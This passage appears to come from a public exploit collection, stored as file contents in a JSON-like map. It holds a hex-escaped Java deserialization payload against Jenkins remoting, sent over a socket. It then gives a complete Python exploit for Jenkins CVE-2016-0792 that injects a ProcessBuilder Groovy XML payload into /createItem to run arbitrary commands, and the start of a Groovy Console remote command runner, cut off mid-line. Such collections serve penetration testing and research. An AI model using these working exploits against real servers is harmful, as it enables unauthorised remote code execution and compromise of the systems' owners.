1\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x48\\x74\\x00\\x1f\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x63\\x6c\\x69\\x2e\\x43\\x4c\\x49\\x43\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x69\\x6f\\x6e\\x46\\x61\\x63\\x74\\x6f\\x72\\x79\\x74\\x00\\x19\\x43\\x4c\\x49\\x43\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x69\\x6f\\x6e\\x46\\x61\\x63\\x74\\x6f\\x72\\x79\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x07\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\xdf\\x71\\x00\\x7e\\x00\\x2d\\x71\\x00\\x7e\\x00\\x2e\\x74\\x00\\x05\\x5f\\x6d\\x61\\x69\\x6e\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\x86\\x71\\x00\\x7e\\x00\\x2d\\x71\\x00\\x7e\\x00\\x2e\\x74\\x00\\x04\\x6d\\x61\\x69\\x6e\\x73\\x72\\x00\\x26\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x24\\x55\\x6e\\x6d\\x6f\\x64\\x69\\x66\\x69\\x61\\x62\\x6c\\x65\\x4c\\x69\\x73\\x74\\xfc\\x0f\\x25\\x31\\xb5\\xec\\x8e\\x10\\x02\\x00\\x01\\x4c\\x00\\x04\\x6c\\x69\\x73\\x74\\x71\\x00\\x7e\\x00\\x0f\\x78\\x72\\x00\\x2c\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x24\\x55\\x6e\\x6d\\x6f\\x64\\x69\\x66\\x69\\x61\\x62\\x6c\\x65\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x19\\x42\\x00\\x80\\xcb\\x5e\\xf7\\x1e\\x02\\x00\\x01\\x4c\\x00\\x01\\x63\\x74\\x00\\x16\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x3b\\x78\\x70\\x73\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x41\\x72\\x72\\x61\\x79\\x4c\\x69\\x73\\x74\\x78\\x81\\xd2\\x1d\\x99\\xc7\\x61\\x9d\\x03\\x00\\x01\\x49\\x00\\x04\\x73\\x69\\x7a\\x65\\x78\\x70\\x00\\x00\\x00\\x00\\x77\\x04\\x00\\x00\\x00\\x00\\x78\\x71\\x00\\x7e\\x00\\x3c\\x78\\x71\\x00\\x7e\\x00\\x08\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x70\\x73\\x7d\\x00\\x00\\x00\\x02\\x00\\x2e\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x24\\x49\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x00\\x1c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x49\\x52\\x65\\x61\\x64\\x52\\x65\\x73\\x6f\\x6c\\x76\\x65\\x78\\x72\\x00\\x17\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x72\\x65\\x66\\x6c\\x65\\x63\\x74\\x2e\\x50\\x72\\x6f\\x78\\x79\\xe1\\x27\\xda\\x20\\xcc\\x10\\x43\\xcb\\x02\\x00\\x01\\x4c\\x00\\x01\\x68\\x74\\x00\\x25\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x72\\x65\\x66\\x6c\\x65\\x63\\x74\\x2f\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x3b\\x78\\x70\\x73\\x72\\x00\\x27\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x03\\x00\\x05\\x5a\\x00\\x14\\x61\\x75\\x74\\x6f\\x55\\x6e\\x65\\x78\\x70\\x6f\\x72\\x74\\x42\\x79\\x43\\x61\\x6c\\x6c\\x65\\x72\\x5a\\x00\\x09\\x67\\x6f\\x69\\x6e\\x67\\x48\\x6f\\x6d\\x65\\x49\\x00\\x03\\x6f\\x69\\x64\\x5a\\x00\\x09\\x75\\x73\\x65\\x72\\x50\\x72\\x6f\\x78\\x79\\x4c\\x00\\x06\\x6f\\x72\\x69\\x67\\x69\\x6e\\x71\\x00\\x7e\\x00\\x0d\\x78\\x70\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x73\\x71\\x00\\x7e\\x00\\x0b\\x71\\x00\\x7e\\x00\\x43\\x74\\x00\\x78\\x50\\x72\\x6f\\x78\\x79\\x20\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x40\\x32\\x20\\x77\\x61\\x73\\x20\\x63\\x72\\x65\\x61\\x74\\x65\\x64\\x20\\x66\\x6f\\x72\\x20\\x69\\x6e\\x74\\x65\\x72\\x66\\x61\\x63\\x65\\x20\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x24\\x49\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x75\\x71\\x00\\x7e\\x00\\x11\\x00\\x00\\x00\\x0d\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x7d\\x71\\x00\\x7e\\x00\\x24\\x71\\x00\\x7e\\x00\\x25\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x89\\x71\\x00\\x7e\\x00\\x24\\x71\\x00\\x7e\\x00\\x25\\x74\\x00\\x04\\x77\\x72\\x61\\x70\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x02\\x6a\\x71\\x00\\x7e\\x00\\x20\\x71\\x00\\x7e\\x00\\x21\\x74\\x00\\x06\\x65\\x78\\x70\\x6f\\x72\\x74\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x02\\xa6\\x74\\x00\\x21\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x74\\x00\\x16\\x52\\x65\\x6d\\x6f\\x74\\x65\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x4a\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x46\\x71\\x00\\x7e\\x00\\x1d\\x71\\x00\\x7e\\x00\\x1e\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x03\\x08\\x71\\x00\\x7e\\x00\\x20\\x71\\x00\\x7e\\x00\\x21\\x71\\x00\\x7e\\x00\\x22\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\xfa\\x71\\x00\\x7e\\x00\\x24\\x71\\x00\\x7e\\x00\\x25\\x71\\x00\\x7e\\x00\\x26\\x73\\x71\\x00\\x7e\\x00\\x13\\xff\\xff\\xff\\xff\\x71\\x00\\x7e\\x00\\x28\\x70\\x71\\x00\\x7e\\x00\\x29\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x04\\xe7\\x71\\x00\\x7e\\x00\\x20\\x71\\x00\\x7e\\x00\\x21\\x71\\x00\\x7e\\x00\\x2b\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x93\\x71\\x00\\x7e\\x00\\x2d\\x71\\x00\\x7e\\x00\\x2e\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x48\\x71\\x00\\x7e\\x00\\x30\\x71\\x00\\x7e\\x00\\x31\\x71\\x00\\x7e\\x00\\x32\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\xdf\\x71\\x00\\x7e\\x00\\x2d\\x71\\x00\\x7e\\x00\\x2e\\x71\\x00\\x7e\\x00\\x34\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\x86\\x71\\x00\\x7e\\x00\\x2d\\x71\\x00\\x7e\\x00\\x2e\\x71\\x00\\x7e\\x00\\x36\\x71\\x00\\x7e\\x00\\x3a\\x78\\x78\\x75\\x72\\x00\\x02\\x5b\\x42\\xac\\xf3\\x17\\xf8\\x06\\x08\\x54\\xe0\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x07\\x46\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x32\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x24\\x52\\x50\\x43\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x04\\x49\\x00\\x03\\x6f\\x69\\x64\\x5b\\x00\\x09\\x61\\x72\\x67\\x75\\x6d\\x65\\x6e\\x74\\x73\\x74\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x4f\\x62\\x6a\\x65\\x63\\x74\\x3b\\x4c\\x00\\x0a\\x6d\\x65\\x74\\x68\\x6f\\x64\\x4e\\x61\\x6d\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x05\\x74\\x79\\x70\\x65\\x73\\x74\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x77\\x08\\xff\\xff\\xff\\xfe\\x00\\x00\\x00\\x02\\x78\\x72\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x03\\x49\\x00\\x02\\x69\\x64\\x49\\x00\\x08\\x6c\\x61\\x73\\x74\\x49\\x6f\\x49\\x64\\x4c\\x00\\x08\\x72\\x65\\x73\\x70\\x6f\\x6e\\x73\\x65\\x74\\x00\\x1a\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2f\\x52\\x65\\x73\\x70\\x6f\\x6e\\x73\\x65\\x3b\\x77\\x04\\x00\\x00\\x00\\x00\\x78\\x72\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x01\\x4c\\x00\\x09\\x63\\x72\\x65\\x61\\x74\\x65\\x64\\x41\\x74\\x74\\x00\\x15\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\x3b\\x77\\x04\\x00\\x00\\x00\\x00\\x78\\x70\\x73\\x72\\x00\\x1e\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x24\\x53\\x6f\\x75\\x72\\x63\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x01\\x4c\\x00\\x06\\x74\\x68\\x69\\x73\\x24\\x30\\x74\\x00\\x19\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2f\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x3b\\x77\\x04\\x00\\x00\\x00\\x00\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\xd0\\xfd\\x1f\\x3e\\x1a\\x3b\\x1c\\xc4\\x02\\x00\\x00\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\xd5\\xc6\\x35\\x27\\x39\\x77\\xb8\\xcb\\x03\\x00\\x04\\x4c\\x00\\x05\\x63\\x61\\x75\\x73\\x65\\x74\\x00\\x15\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x54\\x68\\x72\\x6f\\x77\\x61\\x62\\x6c\\x65\\x3b\\x4c\\x00\\x0d\\x64\\x65\\x74\\x61\\x69\\x6c\\x4d\\x65\\x73\\x73\\x61\\x67\\x65\\x71\\x00\\x7e\\x00\\x02\\x5b\\x00\\x0a\\x73\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x74\\x00\\x1e\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x3b\\x4c\\x00\\x14\\x73\\x75\\x70\\x70\\x72\\x65\\x73\\x73\\x65\\x64\\x45\\x78\\x63\\x65\\x70\\x74\\x69\\x6f\\x6e\\x73\\x74\\x00\\x10\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x4c\\x69\\x73\\x74\\x3b\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x71\\x00\\x7e\\x00\\x10\\x70\\x75\\x72\\x00\\x1e\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x3b\\x02\\x46\\x2a\\x3c\\x3c\\xfd\\x22\\x39\\x02\\x00\\x00\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x00\\x00\\x00\\x0b\\x73\\x72\\x00\\x1b\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x61\\x63\\x6b\\x54\\x72\\x61\\x63\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x61\\x09\\xc5\\x9a\\x26\\x36\\xdd\\x85\\x02\\x00\\x04\\x49\\x00\\x0a\\x6c\\x69\\x6e\\x65\\x4e\\x75\\x6d\\x62\\x65\\x72\\x4c\\x00\\x0e\\x64\\x65\\x63\\x6c\\x61\\x72\\x69\\x6e\\x67\\x43\\x6c\\x61\\x73\\x73\\x71\\x00\\x7e\\x00\\x02\\x4c\\x00\\x08\\x66\\x69\\x6c\\x65\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x02\\x4c\\x00\\x0a\\x6d\\x65\\x74\\x68\\x6f\\x64\\x4e\\x61\\x6d\\x65\\x71\\x00\\x7e\\x00\\x02\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x00\\x00\\x00\\x43\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x74\\x00\\x0c\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x06\\x3c\\x69\\x6e\\x69\\x74\\x3e\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x32\\x71\\x00\\x7e\\x00\\x15\\x71\\x00\\x7e\\x00\\x16\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x63\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x74\\x00\\x0c\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x02\\x39\\x74\\x00\\x32\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x24\\x52\\x50\\x43\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x74\\x00\\x1c\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\xf6\\x74\\x00\\x27\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x48\\x61\\x6e\\x64\\x6c\\x65\\x72\\x71\\x00\\x7e\\x00\\x1e\\x74\\x00\\x06\\x69\\x6e\\x76\\x6f\\x6b\\x65\\x73\\x71\\x00\\x7e\\x00\\x13\\xff\\xff\\xff\\xff\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x24\\x50\\x72\\x6f\\x78\\x79\\x31\\x70\\x74\\x00\\x0f\\x77\\x61\\x69\\x74\\x46\\x6f\\x72\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x04\\xe7\\x74\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x68\\x61\\x6e\\x6e\\x65\\x6c\\x74\\x00\\x0c\\x43\\x68\\x61\\x6e\\x6e\\x65\\x6c\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x15\\x77\\x61\\x69\\x74\\x46\\x6f\\x72\\x52\\x65\\x6d\\x6f\\x74\\x65\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x93\\x74\\x00\\x0e\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x63\\x6c\\x69\\x2e\\x43\\x4c\\x49\\x74\\x00\\x08\\x43\\x4c\\x49\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x48\\x74\\x00\\x1f\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x63\\x6c\\x69\\x2e\\x43\\x4c\\x49\\x43\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x69\\x6f\\x6e\\x46\\x61\\x63\\x74\\x6f\\x72\\x79\\x74\\x00\\x19\\x43\\x4c\\x49\\x43\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x69\\x6f\\x6e\\x46\\x61\\x63\\x74\\x6f\\x72\\x79\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x07\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\xdf\\x71\\x00\\x7e\\x00\\x2a\\x71\\x00\\x7e\\x00\\x2b\\x74\\x00\\x05\\x5f\\x6d\\x61\\x69\\x6e\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\x86\\x71\\x00\\x7e\\x00\\x2a\\x71\\x00\\x7e\\x00\\x2b\\x74\\x00\\x04\\x6d\\x61\\x69\\x6e\\x73\\x72\\x00\\x26\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x24\\x55\\x6e\\x6d\\x6f\\x64\\x69\\x66\\x69\\x61\\x62\\x6c\\x65\\x4c\\x69\\x73\\x74\\xfc\\x0f\\x25\\x31\\xb5\\xec\\x8e\\x10\\x02\\x00\\x01\\x4c\\x00\\x04\\x6c\\x69\\x73\\x74\\x71\\x00\\x7e\\x00\\x0f\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x72\\x00\\x2c\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x24\\x55\\x6e\\x6d\\x6f\\x64\\x69\\x66\\x69\\x61\\x62\\x6c\\x65\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x19\\x42\\x00\\x80\\xcb\\x5e\\xf7\\x1e\\x02\\x00\\x01\\x4c\\x00\\x01\\x63\\x74\\x00\\x16\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x3b\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x73\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x41\\x72\\x72\\x61\\x79\\x4c\\x69\\x73\\x74\\x78\\x81\\xd2\\x1d\\x99\\xc7\\x61\\x9d\\x03\\x00\\x01\\x49\\x00\\x04\\x73\\x69\\x7a\\x65\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x00\\x00\\x00\\x00\\x77\\x04\\x00\\x00\\x00\\x00\\x78\\x71\\x00\\x7e\\x00\\x39\\x78\\x71\\x00\\x7e\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x00\\x00\\x00\\x01\\x75\\x72\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x4f\\x62\\x6a\\x65\\x63\\x74\\x3b\\x90\\xce\\x58\\x9f\\x10\\x73\\x29\\x6c\\x02\\x00\\x00\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x00\\x00\\x00\\x01\\x74\\x00\\x18\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x63\\x6c\\x69\\x2e\\x43\\x6c\\x69\\x45\\x6e\\x74\\x72\\x79\\x50\\x6f\\x69\\x6e\\x74\\x71\\x00\\x7e\\x00\\x24\\x75\\x72\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\xad\\xd2\\x56\\xe7\\xe9\\x1d\\x7b\\x47\\x02\\x00\\x00\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x00\\x00\\x00\\x01\\x74\\x00\\x10\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x4f\\x62\\x6a\\x65\\x63\\x74\\x74\\x00\\x1d\\x52\\x50\\x43\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x28\\x31\\x2c\\x77\\x61\\x69\\x74\\x46\\x6f\\x72\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x29'\n\nsock.send(payload)\nprint('[+] Sent payload')\n",
    "CVE Exploits/Jenkins CVE-2016-0792.py": "#! /usr/bin/env python2\n\n#Jenkins Groovy XML RCE (CVE-2016-0792)\n#Note: Although this is listed as a pre-auth RCE, during my testing it only worked if authentication was disabled in Jenkins\n#Made with <3 by @byt3bl33d3r\n\nfrom __future__ import print_function\nimport requests\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nimport argparse\nimport sys\n\nparser = argparse.ArgumentParser()\nparser.add_argument('target', type=str, help='Target IP:PORT')\nparser.add_argument('command', type=str, help='Command to run on target')\nparser.add_argument('--proto', choices={'http', 'https'}, default='http', help='Send exploit over http or https (default: http)')\n\nif len(sys.argv) < 2:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\n\nif len(args.target.split(':')) != 2:\n    print('[-] Target must be in format IP:PORT')\n    sys.exit(1)\n\nif not args.command:\n    print('[-] You must specify a command to run')\n    sys.exit(1)\n\nip, port = args.target.split(':')\n\nprint('[*] Target IP: {}'.format(ip))\nprint('[*] Target PORT: {}'.format(port))\n\nxml_formatted = ''\ncommand_list = args.command.split()\nfor cmd in command_list:\n    xml_formatted += '{:>16}<string>{}</string>\\n'.format('', cmd)\n\nxml_payload = '''<map>\n  <entry>\n    <groovy.util.Expando>\n      <expandoProperties>\n        <entry>\n          <string>hashCode</string>\n          <org.codehaus.groovy.runtime.MethodClosure>\n            <delegate class=\"groovy.util.Expando\" reference=\"../../../..\"/>\n            <owner class=\"java.lang.ProcessBuilder\">\n              <command>\n                {}\n              </command>\n              <redirectErrorStream>false</redirectErrorStream>\n            </owner>\n            <resolveStrategy>0</resolveStrategy>\n            <directive>0</directive>\n            <parameterTypes/>\n            <maximumNumberOfParameters>0</maximumNumberOfParameters>\n            <method>start</method>\n          </org.codehaus.groovy.runtime.MethodClosure>\n        </entry>\n      </expandoProperties>\n    </groovy.util.Expando>\n   <int>1</int>\n </entry>\n</map>'''.format(xml_formatted.strip())\n\nprint('[*] Generated XML payload:')\nprint(xml_payload)\nprint() \n\nprint('[*] Sending payload')\nheaders = {'Content-Type': 'text/xml'}\nr = requests.post('{}://{}:{}/createItem?name=rand_dir'.format(args.proto, ip, port), verify=False, headers=headers, data=xml_payload)\n\npaths_in_trace = ['jobs/rand_dir/config.xml', 'jobs\\\\rand_dir\\\\config.xml']\nif r.status_code == 500:\n    for path in paths_in_trace:\n        if path in r.text:\n            print('[+] Command executed successfully')\n            break\n",
    "CVE Exploits/Jenkins Groovy Console.py": "#!/usr/bin/env python\r\n# SRC: https://raw.githubusercontent.com/bl4de/security-tools/master/jgc.py\r\n# DOC: https://medium.com/@_bl4de/remote-code-execution-with-groovy-console-in-jenkins-bd6ef55c285b\r\nfrom __future__ import print_function\nfrom builtins import input\nimport requests\r\nimport sys\r\n\r\nprint(\"\"\"\r\nJenkins Groovy Console cmd runner.\r\n\r\nusage: ./jgc.py [HOST]\r\n\r\nThen type any command and wait for STDOUT output from remote machine.\r\nType 'exit' to exit :)\r\n\"\"\")\r\nURL = sys.argv[1] + '/scriptText'\r\nHEADERS = {\r\n    'User-Agent': 'jgc'\r\n}\r\n\r\nwhile 1:\r\n    CMD = input(\">> Enter command to 